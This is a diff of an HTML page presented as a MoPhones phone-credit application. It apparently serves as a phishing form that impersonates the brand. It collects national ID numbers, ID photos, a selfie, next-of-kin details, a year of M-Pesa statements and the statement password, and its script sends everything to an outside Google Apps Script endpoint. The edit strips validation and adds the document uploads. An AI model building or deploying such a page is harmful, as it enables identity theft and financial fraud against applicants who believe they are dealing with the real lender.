@@ -1,72 +1,89 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <script>
-    !function(f,b,e,v,n,t,s)
-    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-    n.queue=[];t=b.createElement(e);t.async=!0;
-    t.src=v;s=b.getElementsByTagName(e)[0];
-    s.parentNode.insertBefore(t,s)}(window, document,'script',
-    'https://connect.facebook.net/en_US/fbevents.js');
-    fbq('init', '852047494123267');
-    fbq('track', 'PageView');
-    </script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>MoPhones Credit Pre-Qualification</title>
     <style>
-        body { font-family: Arial, sans-serif; margin: 20px; background-color: #f4f4f9; }
-        .container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); max-width: 600px; margin: auto; }
-        h2 { color: #004488; border-bottom: 2px solid #004488; padding-bottom: 10px; }
-        .disclaimer { border: 2px solid #004488; padding: 15px; margin-bottom: 20px; background-color: #f0f8ff; color: #333; font-weight: bold; }
-        input[type="text"], input[type="tel"], select { width: 100%; padding: 12px; margin: 8px 0; display: inline-block; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
-        input[type="submit"] { background-color: #004488; color: white; padding: 14px 20px; margin: 8px 0; border: none; border-radius: 4px; cursor: pointer; width: 100%; font-size: 1.1em; font-weight: bold; }
-        input[type="submit"]:hover { background-color: #0056b3; }
-        .contact-us { text-align: center; margin-top: 20px; }
-        .error-msg { color: red; font-size: 0.9em; display: none; margin-bottom: 10px; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 20px; background-color: #f0f4f8; color: #333; }
+        .container { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08); max-width: 550px; margin: auto; }
+        .logo-section { text-align: center; margin-bottom: 25px; }
+        h2 { color: #004488; text-align: center; margin-bottom: 10px; font-size: 1.5em; }
+        .search-instruction { background: #e7f3ff; border-left: 4px solid #004488; padding: 12px; margin-bottom: 20px; font-size: 0.95em; line-height: 1.4; }
+        .disclaimer { border: 2px solid #d32f2f; padding: 15px; margin-bottom: 25px; background-color: #fff5f5; border-radius: 6px; }
+        label { display: block; margin-top: 15px; font-weight: 600; color: #444; margin-bottom: 5px; }
+        input[type="text"], input[type="file"], select { width: 100%; padding: 12px; border: 1px solid #cbd5e0; border-radius: 6px; box-sizing: border-box; font-size: 16px; }
+        input[type="submit"] { background-color: #004488; color: white; padding: 16px; margin-top: 25px; border: none; border-radius: 6px; cursor: pointer; width: 100%; font-size: 1.1em; font-weight: bold; transition: background 0.3s; }
+        input[type="submit"]:hover { background-color: #002d5a; }
+        h3 { color: #004488; margin-top: 30px; font-size: 1.2em; border-bottom: 1px solid #eee; padding-bottom: 5px; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <div style="text-align: center; margin-bottom: 20px;">
-        <img src="https://mophones.co/cdn/shop/files/MO-Logo-01_160x.png?v=1691582743" alt="MoPhones Logo" style="max-width: 150px;">
+    <div class="logo-section">
+        <img src="https://mophones.co/cdn/shop/files/MO-Logo-01_160x.png?v=1691582743" alt="MoPhones Logo" style="max-width: 140px;">
     </div>
-    <h2>MoPhones Credit Pre-Qualification</h2>
-    <p>Check pricing at <a href="https://mophones.co" target="_blank">mophones.co</a></p>
 
+    <h2>Credit Pre-Qualification</h2>
+
+    <div class="search-instruction">
+        🔍 <b>How to find your phone:</b><br>
+        Go to <a href="https://mophones.co" target="_blank" style="color:#004488; font-weight:bold;">mophones.co</a> and use the <b>Search Button</b> to search for <b>'Samsung'</b> or <b>'iPhone'</b> to see available models and deposit prices.
+    </div>
+    
     <div class="disclaimer">
-        🛑 <b>HONESTY CHECK:</b> Dishonesty about past loans results in immediate disqualification.
+        🛑 <b>HONESTY CHECK:</b> We do not disqualify for bad credit, only for dishonesty. Be 100% truthful about past loans to get approved.
     </div>
 
-    <form name="submit-to-google-sheet" id="portalForm">
-        <label for="full_name"><b>Full Name (As per ID)</b></label>
-        <input type="text" id="full_name" name="full_name" placeholder="John Doe" required>
+    <form name="submit-to-google-sheet">
+        <label>Preferred Phone Model</label>
+        <input type="text" name="preferred_phone" placeholder="e.g. iPhone 11" required>
 
-        <label for="id_number"><b>National ID Number</b></label>
-        <input type="text" id="id_number" name="id_number" placeholder="12345678" required>
-
-        <label for="preferred_phone"><b>Preferred Phone Model</b></label>
-        <input type="text" id="preferred_phone" name="preferred_phone" placeholder="e.g. Samsung A42" required>
-
-        <label for="region"><b>Region</b></label>
-        <select id="region" name="region" required>
+        <label>Current Phone Model</label>
+        <input type="text" name="current_phone_model" placeholder="The phone you use now" required>
+        
+        <label>Region of Residence</label>
+        <select name="region" required>
             <option value="" disabled selected>Select Location</option>
             <option value="nairobi">Nairobi County</option>
             <option value="kiambu">Kiambu County</option>
             <option value="nakuru">Nakuru Town</option>
-            <option value="machakos">Machakos</option>
+            <option value="machakos_syokimau">Machakos (Syokimau/Mlolongo)</option>
+            <option value="machakos_town">Machakos (Town)</option>
+            <option value="kajiado_kitengela">Kajiado (Kitengela)</option>
+            <option value="kajiado_rongai">Kajiado (Rongai/Ngong)</option>
         </select>
 
-        <label for="nok_contact"><b>Next of Kin Contact Number</b></label>
-        <input type="tel" id="nok_contact" name="nok_contact" placeholder="0712345678" required>
+        <label>Full Name (As per ID)</label>
+        <input type="text" name="full_name" placeholder="John Doe" required>
 
-        <label for="mpesa_password"><b>M-Pesa Statement Password</b></label>
-        <input type="text" id="mpesa_password" name="mpesa_password" required>
+        <label>National ID Number</label>
+        <input type="text" name="id_number" required>
 
-        <div id="errorBox" class="error-msg">Please check your details and try again.</div>
+        <h3>Next of Kin</h3>
+        <label>Next of Kin Name</label>
+        <input type="text" name="nok_name" required>
+        <label>Next of Kin ID Number</label>
+        <input type="text" name="nok_id" required>
+        <label>Next of Kin Contact</label>
+        <input type="text" name="nok_contact" placeholder="0712345678" required>
+
+        <h3>Documents (ID & Statements)</h3>
+        <label>1. National ID Front</label>
+        <input type="file" name="id_front_pic" accept="image/*" required>
+        
+        <label>2. National ID Back</label>
+        <input type="file" name="id_back_pic" accept="image/*" required>
+        
+        <label>3. Selfie Picture</label>
+        <input type="file" name="selfie_pic" accept="image/*" required>
+        
+        <label>4. 12 Months M-Pesa Statement (PDF)</label>
+        <input type="file" name="mpesa_statement" accept=".pdf" required>
+        
+        <label>5. M-Pesa Statement Password</label>
+        <input type="text" name="mpesa_password" required>
 
         <input type="submit" value="Submit Application">
     </form>
@@ -75,37 +92,17 @@
 <script>
   const scriptURL = 'https://script.google.com/macros/s/AKfycbzxoZV-BC7jYgCwuR4y9SVgALBMqLWWoIfH889LpnC-BagmGhT6cHmZwSZI4icGq03o/exec';
   const form = document.forms['submit-to-google-sheet'];
-  const errorBox = document.getElementById('errorBox');
 
   form.addEventListener('submit', e => {
     e.preventDefault();
-    errorBox.style.display = 'none';
-
-    // SIMPLE VALIDATION LOGIC
-    const idNum = document.getElementById('id_number').value;
-    const nokPhone = document.getElementById('nok_contact').value;
-
-    if (idNum.length < 7 || idNum.length > 10) {
-        alert("Invalid ID Number. Please check again.");
-        return;
-    }
-
-    if (nokPhone.length < 10) {
-        alert("Please enter a valid phone number.");
-        return;
-    }
-
-    alert("Submitting to MoPhones Portal... please wait.");
-
+    alert("Uploading documents... This may take up to 30 seconds. Please do not close the page.");
+    
     fetch(scriptURL, { method: 'POST', body: new FormData(form)})
       .then(response => {
-          alert("SUCCESS! Your application is in the system.");
+          alert("Success! Your application has been received.");
           form.reset();
       })
-      .catch(error => {
-          console.error('Error!', error.message);
-          alert("Submission failed. Check your internet and try again.");
-      });
+      .catch(error => alert("Error! Please check your internet connection."));
   });
 </script>
 
